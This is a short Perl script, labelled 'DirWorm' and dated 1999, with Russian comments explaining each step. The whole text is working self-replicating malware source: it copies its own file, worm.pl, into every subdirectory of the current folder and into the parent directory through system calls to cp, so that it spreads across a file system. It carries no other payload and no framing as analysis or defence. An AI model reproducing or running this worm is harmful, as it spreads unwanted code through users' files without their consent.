# DirWorm by -Byst- (c) 1999
while (<*>)                     # Ищем все файлы в текущей директории
{
  if (chdir($_)) {              # Если это директория - сменить текущую на нее
   @command = ("cp ../worm.pl ./worm.pl > /dev/null");
   system @command;             # Вызов системной функции копирования файла
   chdir("..");                 # Возращаемся обратно в начальную директорию
  }
}
@command = ("cp ./worm.pl ../worm.pl");
system @command;                # Копируем тело в родительскую директорию
